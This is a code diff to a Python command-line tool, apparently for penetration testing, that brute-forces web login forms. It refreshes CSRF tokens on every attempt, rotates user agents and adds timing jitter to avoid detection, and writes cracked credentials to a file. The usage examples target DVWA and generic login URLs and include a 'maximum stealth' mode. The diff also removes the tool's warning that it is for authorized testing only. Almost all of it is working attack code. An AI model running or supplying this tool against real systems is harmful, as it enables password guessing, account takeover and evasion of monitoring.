-    logger.info("\033[1;35m  MITRE ATT&CK: T1110.001 | Cyber Kill Chain: Exploitation\033[0m")
-    logger.info("=" * 65)
-    logger.info(f"  Target     : {login_url}")
-    logger.info(f"  Username   : {username}")
-    logger.info(f"  Wordlist   : {wordlist_path}")
-    logger.info(f"  Token Name : {token_name}")
-    logger.info(f"  Jitter     : {jitter_range[0]:.1f}s - {jitter_range[1]:.1f}s")
-    logger.info(f"  UA Rotation: {'Enabled' if rotate_ua else 'Disabled'}")
-    logger.info(f"  Proxy      : {proxy or 'None'}")
-    logger.info("=" * 65)
-
+    global _interrupted, _results_cache
+    _interrupted = False
+    
+    # Install signal handler for graceful Ctrl+C
+    original_handler = signal.getsignal(signal.SIGINT)
+    signal.signal(signal.SIGINT, _signal_handler)
+    
+    # The target URL IS the login URL — full flexibility
+    login_url = target_url.rstrip("/")
+    if not login_url.startswith("http"):
+        login_url = "http://" + login_url
+    
     # Load wordlist
     passwords = load_wordlist(wordlist_path)
     total = len(passwords)
-    logger.info(f"\033[36m[*]\033[0m Loaded {total} passwords from wordlist")
-
+    
+    # Initialize cache
+    _results_cache = ResultsCache()
+    _results_cache.target_url = login_url
+    _results_cache.username = username
+    _results_cache.start_time = datetime.now()
+    
+    # Print banner
+    print_banner(
+        target_url=login_url,
+        username=username,
+        wordlist_path=wordlist_path,
+        total_passwords=total,
+        token_name=token_name,
+        jitter_range=jitter_range,
+        rotate_ua=rotate_ua,
+        proxy=proxy
+    )
+    
     if total == 0:
-        logger.error("[!] Wordlist is empty. Aborting.")
+        print(f"  {C.BRED}[!]{C.RST} Wordlist is empty. Aborting.")
+        _results_cache.print_summary()
+        signal.signal(signal.SIGINT, original_handler)
         return None
-
+    
     # ---- STEP 1: Session Initialization ----
-    logger.info("\033[32m[STEP 1]\033[0m Initializing session...")
-    session = init_session(target_url, proxy=proxy, logger=logger)
-
-    start_time = datetime.now()
+    print(f"  {C.GREEN}▶{C.RST} Initializing session...\n")
+    session = init_session(login_url, proxy=proxy, verbose=verbose)
+    print()
+    
     cracked_password = None
-
+    
     # ---- STEP 7: Main Loop ----
-    for attempt, password in enumerate(passwords, 1):
-        logger.info(
-            f"\033[34m[{attempt}/{total}]\033[0m "
-            f"Trying: \033[1m{username}\033[0m : \033[1m{password}\033[0m"
-        )
-
-        try:
-            # ---- STEP 2 + 3: Fetch page & Extract token ----
-            # Token is refreshed EVERY iteration because CSRF tokens
-            # are single-use nonces that are invalidated after consumption
-            csrf_token = fetch_csrf_token(
-                session, login_url,
-                token_name=token_name, logger=logger
-            )
-
-            # ---- STEP 4: Payload Construction ----
-            payload = build_payload(
-                username=username,
-                password=password,
-                csrf_token=csrf_token,
-                token_name=token_name
-            )
-            logger.debug(
-                f"\033[33m[STEP 4]\033[0m Payload built | "
-                f"Params: {list(payload.keys())}"
-            )
-
-            # ---- STEP 5: Execution & Evasion ----
-            response = execute_attempt(
-                session, login_url, payload,
-                jitter_range=jitter_range,
-                rotate_ua=rotate_ua,
-                logger=logger
-            )
-
-            # ---- STEP 6: Response Analysis ----
-            success = analyze_response(
-                response,
-                failure_string=failure_string,
-                success_path=success_path,
-                logger=logger
-            )
-
-            if success:
-                elapsed = (datetime.now() - start_time).total_seconds()
-                cracked_password = password
-
-                logger.info("")
-                logger.info("=" * 65)
-                logger.info(
-                    f"\033[1;32m  [SUCCESS] Password found!\033[0m"
+    try:
+        for attempt, password in enumerate(passwords, 1):
+            # Check interrupt flag (set by Ctrl+C handler)
+            if _interrupted:
+                break
+            
+            attempt_start = time.time()
+            
+            try:
+                # STEP 2+3: Fetch fresh CSRF token (AUTOMATED & DYNAMIC)
+                csrf_token = fetch_csrf_token(
+                    session, login_url,
+                    token_name=token_name, verbose=verbose
                 )
-                logger.info(f"  Username : {username}")
-                logger.info(f"  Password : {password}")
-                logger.info(f"  Attempts : {attempt}/{total}")
-                logger.info(f"  Duration : {elapsed:.1f}s")
-                logger.info("=" * 65)
-
-                # Write results to file if specified
-                if output_file:
-                    with open(output_file, "a") as f:
-                        f.write(
-                            f"[{datetime.now().isoformat()}] "
-                            f"{username}:{password} "
-                            f"({attempt} attempts, {elapsed:.1f}s)\n"
-                        )
-                    logger.info(f"  Results written to: {output_file}")
-
-                return cracked_password
-
-            # ---- STEP 7 (Reset): Discard used token ----
-            # The token variable goes out of scope here and will be
-            # re-fetched in the next iteration. This is critical because
-            # the server has already consumed/invalidated this token.
-            del csrf_token
-            logger.debug(
-                "\033[90m[STEP 7]\033[0m Token invalidated, "
-                "returning to Step 2 for fresh token"
-            )
-
-        except ValueError as e:
-            # Token extraction failed - page structure may have changed
-            logger.warning(f"\033[33m[!]\033[0m Token error: {e}")
-            logger.info("    Retrying with fresh session...")
-            session = init_session(target_url, proxy=proxy, logger=logger)
-            continue
-
-        except requests.RequestException as e:
-            # Network error - retry with backoff
-            logger.warning(f"\033[33m[!]\033[0m Network error: {e}")
-            logger.info("    Backing off for 5 seconds...")
-            time.sleep(5)
-            continue
-
-    # Wordlist exhausted without success
-    elapsed = (datetime.now() - start_time).total_seconds()
-    logger.info("")
-    logger.info("=" * 65)
-    logger.info(f"\033[1;31m  [EXHAUSTED] Wordlist complete - no valid password found\033[0m")
-    logger.info(f"  Attempts : {total}")
-    logger.info(f"  Duration : {elapsed:.1f}s")
-    logger.info("=" * 65)
-
-    return None
+                
+                # STEP 4: Build payload
+                payload = build_payload(
+                    username=username,
+                    password=password,
+                    csrf_token=csrf_token,
+                    token_name=token_name
+                )
+                
+                if verbose:
+                    print(
+                        f"  {C.YELLOW}[STEP 4]{C.RST} Payload built {C.DIM}|{C.RST} "
+                        f"Params: {list(payload.keys())}"
+                    )
+                
+                # STEP 5: Execute with evasion
+                response = execute_attempt(
+                    session, login_url, payload,
+                    jitter_range=jitter_range,
+                    rotate_ua=rotate_ua,
+                    verbose=verbose
+                )
+                
+                # STEP 6: Response analysis
+                success = analyze_response(
+                    response,
+                    failure_string=failure_string,
+                    success_path=success_path,
+                    verbose=verbose
+                )
+                
+                elapsed_ms = (time.time() - attempt_start) * 1000
+                
+                # Record in cache
+                _results_cache.record_attempt(
+                    password=password,
+                    success=success,
+                    status_code=response.status_code,
+                    elapsed_ms=elapsed_ms
+                )
+                
+                # Print colorized result
+                print_attempt(
+                    attempt_num=attempt,
+                    total=total,
+                    username=username,
+                    password=password,
+                    success=success,
+                    status_code=response.status_code,
+                    verbose=verbose
+                )
+                
+                if success:
+                    cracked_password = password
+                    
+                    # Write to output file
+                    if output_file:
+                        elapsed = (datetime.now() - _results_cache.start_time).total_seconds()
+                        with open(output_file, "a") as f:
+                            f.write(
+                                f"[{datetime.now().isoformat()}] "
+                                f"{username}:{password} "
+                                f"({attempt} attempts, {elapsed:.1f}s)\n"
+                            )
+                    
+                    # ═══ BREAK THE LOOP — credential found ═══
+                    break
+                
+                # STEP 7 (Reset): Discard consumed token
+                del csrf_token
+                if verbose:
+                    print(
+                        f"  {C.DIM}[STEP 7] Token invalidated → "
+                        f"returning to Step 2{C.RST}"
+                    )
+            
+            except KeyboardInterrupt:
+                break
+            
+            except ValueError as e:
+                elapsed_ms = (time.time() - attempt_start) * 1000
+                _results_cache.record_attempt(
+                    password=password, success=False,
+                    status_code=0, elapsed_ms=elapsed_ms
+                )
+                if verbose:
+                    print(f"  {C.YELLOW}[!]{C.RST} Token error: {e}")
+                    print(f"      Retrying with fresh session...")
+                session = init_session(login_url, proxy=proxy, verbose=verbose)
+                continue
+            
+            except requests.RequestException as e:
+                elapsed_ms = (time.time() - attempt_start) * 1000
+                _results_cache.record_attempt(
+                    password=password, success=False,
+                    status_code=0, elapsed_ms=elapsed_ms
+                )
+                if verbose:
+                    print(f"  {C.YELLOW}[!]{C.RST} Network error: {e}")
+                    print(f"      Backing off 5s...")
+                time.sleep(5)
+                continue
+    
+    except KeyboardInterrupt:
+        pass
+    
+    # ═══════════════════════════════════════════════════════════════
+    # ALWAYS print summary on exit — success, Ctrl+C, or exhaustion
+    # ═══════════════════════════════════════════════════════════════
+    _results_cache.print_summary()
+    
+    # Restore original signal handler
+    signal.signal(signal.SIGINT, original_handler)
+    
+    return cracked_password
 
 
 # ============================================================================
@@ -697,36 +804,34 @@ def run_attack(
 def parse_args() -> argparse.Namespace:
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
-        description="CSRF-Aware Brute Force Engine for Penetration Testing",
+        description="CSRF-Aware Brute Force Engine v2.0 for Penetration Testing",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Basic DVWA brute force
-  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt
+  # DVWA brute (high-security with CSRF)
+  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w passwords.txt
 
-  # With proxy (Burp Suite) and verbose output
-  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt \\
+  # DVWA main login page
+  python3 csrf_brute.py -t http://192.168.1.100/login.php -u admin -w passwords.txt
+
+  # Custom app with different token name
+  python3 csrf_brute.py -t http://target.local/auth/login -u admin -w rockyou.txt \\
+      --token-name csrf_token --failure "Invalid credentials"
+
+  # With Burp Suite proxy + verbose
+  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w passwords.txt \\
       --proxy http://127.0.0.1:8080 -v
 
-  # Custom token name, failure string, and output file
-  python3 csrf_brute.py -t http://target.local -u admin -w rockyou.txt \\
-      --token-name csrf_token --failure "Invalid credentials" -o results.txt
-
-  # Aggressive timing (faster, less stealthy)
-  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt \\
-      --jitter-min 0.1 --jitter-max 0.5
-
-  # Maximum stealth (slower, harder to detect)
-  python3 csrf_brute.py -t http://192.168.1.100 -u admin -w passwords.txt \\
+  # Maximum stealth
+  python3 csrf_brute.py -t http://target/login -u admin -w passwords.txt \\
       --jitter-min 3.0 --jitter-max 10.0
         """
     )
 
-    # Required arguments
     parser.add_argument(
         "-t", "--target",
         required=True,
-        help="Target base URL (e.g., http://192.168.1.100)"
+        help="Full target URL to attack (e.g., http://192.168.1.100/vulnerabilities/brute/)"
     )
     parser.add_argument(
         "-u", "--username",
@@ -738,13 +843,6 @@ Examples:
         required=True,
         help="Path to password wordlist file"
     )
-
-    # Optional arguments
-    parser.add_argument(
-        "-p", "--path",
-        default="/vulnerabilities/brute/",
-        help="Login endpoint path (default: /vulnerabilities/brute/)"
-    )
     parser.add_argument(
         "--token-name",
         default="user_token",
@@ -753,12 +851,12 @@ Examples:
     parser.add_argument(
         "--failure",
         default="Login failed",
-        help='Failure indicator string (default: "Login failed")'
+        help='Failure string in response body (default: "Login failed")'
     )
     parser.add_argument(
         "--success-path",
         default="/dashboard",
-        help="Success redirect path (default: /dashboard)"
+        help="Redirect path indicating success (default: /dashboard)"
     )
     parser.add_argument(
         "--jitter-min",
@@ -779,16 +877,16 @@ Examples:
     )
     parser.add_argument(
         "--proxy",
-        help="HTTP proxy URL (e.g., http://127.0.0.1:8080)"
+        help="HTTP proxy (e.g., http://127.0.0.1:8080 for Burp Suite)"
     )
     parser.add_argument(
         "-o", "--output",
-        help="Output file for results"
+        help="Output file to append cracked credentials"
     )
     parser.add_argument(
         "-v", "--verbose",
         action="store_true",
-        help="Enable verbose/debug output"
+        help="Enable verbose/debug output (show all STEP details)"
     )
 
     return parser.parse_args()
@@ -798,14 +896,8 @@ def main():
     """Entry point."""
     args = parse_args()
 
-    print("\n\033[1;31m" + "=" * 65)
-    print("  ⚠  AUTHORIZED PENETRATION TESTING USE ONLY")
-    print("  Unauthorized access to computer systems is illegal.")
-    print("=" * 65 + "\033[0m\n")
-
     result = run_attack(
         target_url=args.target,
-        login_path=args.path,
         username=args.username,
         wordlist_path=args.wordlist,
         token_name=args.token_name,
